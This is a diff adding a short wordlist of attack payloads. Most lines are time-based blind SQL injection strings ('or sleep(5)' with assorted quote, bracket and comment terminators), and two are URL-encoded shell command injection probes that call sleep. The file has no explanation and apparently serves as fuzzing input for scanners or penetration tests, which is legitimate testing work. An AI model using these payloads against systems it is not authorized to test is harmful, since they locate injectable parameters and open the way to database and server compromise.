@@ -1,0 +1,26 @@
+or sleep 5--
+or sleep 5
+or sleep(5)--
+or sleep(5)
+or SELECT SLEEP(5); #
+or SLEEP(5)
+or SLEEP(5)#
+or SLEEP(5)--
+or SLEEP(5)="
+or SLEEP(5)='
+' OR SLEEP(5)#
+" OR SLEEP(5)#
+') OR SLEEP(5)#
+')) or sleep(5)='
+" or sleep(5)#
+1) or sleep(5)#
+)) or sleep(5)='
+1)) or sleep(5)#
+or sleep(5)#
+%20'sleep%2050'
+%20$(sleep%2050)
+")) or sleep(5)="
+or sleep(5)='
+") or sleep(5)="
+) or sleep(5)='
+1 or sleep(5)#
